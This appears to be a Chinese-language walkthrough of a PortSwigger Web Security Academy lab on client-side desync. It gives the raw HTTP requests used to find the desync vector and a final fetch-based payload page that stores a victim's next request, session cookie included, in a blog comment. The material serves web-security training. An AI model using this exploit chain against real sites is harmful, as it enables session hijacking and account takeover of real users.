# 实验：客户端反同步

本实验容易受到客户端反同步攻击，因为服务器会忽略对某些端点的请求中的 `Content-Length` 头。您可以利用这一点诱导受害者的浏览器泄露其会话 Cookie。

要解决本实验：

1. 在 Burp 中识别一个客户端反同步向量，然后确认您可以在浏览器中复现它。
2. 识别一个能够让您在应用程序中存储文本数据的小工具。
3. 结合这些来构造一个漏洞利用，使受害者的浏览器发出一系列跨域请求，泄露其会话 Cookie。
4. 使用窃取的 Cookie 访问受害者的账户。

> **提示**
>
> 本实验是我们在[之前的请求走私实验](/web-security/request-smuggling/exploiting#capturing-other-users-requests)中介绍的一种技术的客户端变体。

本实验基于 PortSwigger Research 发现的现实世界漏洞。更多详情，请查看 [Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling](https://portswigger.net/research/browser-powered-desync-attacks#csd)。

## 步骤

探测
- 访问主页
    ```http
    GET / HTTP/1.1
    Host: id.h1-web-security-academy.net
    ```
    - 响应
        ```http
        HTTP/1.1 302 Found
        Location: /en
        X-Frame-Options: SAMEORIGIN
        Keep-Alive: timeout=10
        Content-Length: 0
        ```
        - 主页拥有服务器端重定向

- 使用评论功能
    ```http
    POST /en/post/comment HTTP/1.1
    Host: id.h1-web-security-academy.net
    Cookie: session=IscL44Qkk6F1MyNif05EMfzzkR6eIywu

    csrf=O4at76O2x4CanQv0ABDEeDzahdJXKEbl&postId=2&comment=c&name=c&email=a%40b&website=
    ```
    - 可用来储存信息

识别反同步向量
- 尝试对作为重定向端点的主页提交 POST
    ```http
    POST / HTTP/1.1
    Host: id.h1-web-security-academy.net
    Connection: keep-alive
    Content-Length: 25

    GET /404 HTTP/1.1
    Foo: x
    ```
    - 响应2
        ```http
        HTTP/1.1 404 Not Found
        Content-Type: application/json; charset=utf-8
        Keep-Alive: timeout=10
        Content-Length: 11

        "Not Found"
        ```
        - 成功返回走私端点响应

- 设置评论端点到走私请求
    ```http
    POST / HTTP/1.1
    Host: id.h1-web-security-academy.net
    Connection: keep-alive
    Content-Length: 255

    POST /en/post/comment HTTP/1.1
    Host: id.h1-web-security-academy.net
    Cookie: session=IscL44Qkk6F1MyNif05EMfzzkR6eIywu
    Content-Length: 199

    csrf=O4at76O2x4CanQv0ABDEeDzahdJXKEbl&postId=2&name=c&email=a@b&website=&comment=d
    ```
    - 成功存储下一个请求的头部
    - 此处需会话 cookie 及绑定的 csrf 令牌，之后调整走私请求的 CL 长度

构建浏览器 POC
- > 注意，此处打开普通的浏览器进行测试。由 burp 代理的浏览器测试将失败
- 使用主页的重定向端点

    ```javascript
    fetch('https://id.h1-web-security-academy.net/', {
        method: 'POST',
        body: 'GET /404 HTTP/1.1\r\nFoo: x',
        mode: 'cors',
        credentials: 'include'
    }).catch(() => {
        fetch('https://id.h1-web-security-academy.net/')
    })
    ```
    - 在同源页面打开控制台输入
        - 请求2得到 404 响应，成功

- 设置跨域页面载荷
    ```js
    fetch('https://id.h1-web-security-academy.net/', {
        method: 'POST',
        body: 'GET /404 HTTP/1.1\r\nFoo: x',
        mode: 'cors',
        credentials: 'include'
    }).catch(() => {
        fetch('https://id.h1-web-security-academy.net/', {
            mode: 'no-cors',
            credentials: 'include'
        })
    })
    ```
    - 设置 fetch 参数：设置允许跨域，并携带凭证。在跨域页面打开
        - 请求2得到 404 响应，成功

- > 注意，主题示例的 `location` 跳转将被执行，而不会触发走私

- 继续构建
    ```javascript
    fetch('https://id.h1-web-security-academy.net/', {
        method: 'POST',
        body: 'POST /en/post/comment HTTP/1.1\r\nHost: id.h1-web-security-academy.net\r\nCookie: session=cnf6wLBjospe1eR9vHLvr799K0ps1u3q\r\nContent-Length: 300\r\n\r\ncsrf=IgHeTUIHPv7mPrKpsLyHQOjvCS9rsazV&postId=2&name=c&email=a@b&website=&comment=x',
        mode: 'cors',
        credentials: 'include'
    }).catch(() => {
        fetch('https://id.h1-web-security-academy.net/', {
            mode: 'no-cors',
            credentials: 'include'
        })
    })
    ```

    - 浏览器提交后，查看文章端点
        ```http
        GET /en/post?postId=2 HTTP/1.1
        ```
        - 评论内容
            ```log
            xGET / HTTP/1.1 Host: id.h1-web-security-academy.net Connection: keep-alive sec-ch-ua-platform: "Windows" Accept-Language: zh-CN,zh;q=0.9 sec-ch-ua: "Not-A.Brand";v="24", "Chromium";v=
            ```
        
        - 成功窃取下一个响应的数据

最终攻击
- 载荷页面
    ```html
    <script>
        fetch('https://id.h1-web-security-academy.net/', {
            method: 'POST',
            body: 'POST /en/post/comment HTTP/1.1\r\nHost: id.h1-web-security-academy.net\r\nCookie: session=cnf6wLBjospe1eR9vHLvr799K0ps1u3q\r\nContent-Length: 900\r\n\r\ncsrf=IgHeTUIHPv7mPrKpsLyHQOjvCS9rsazV&postId=2&name=c&email=a@b&website=&comment=x',
            mode: 'cors',
            credentials: 'include'
        }).catch(() => {
            fetch('https://id.h1-web-security-academy.net/', {
                mode: 'no-cors',
                credentials: 'include'
            })
        })
    </script>
    ```
    - 微调被走私的请求 CL 到 900
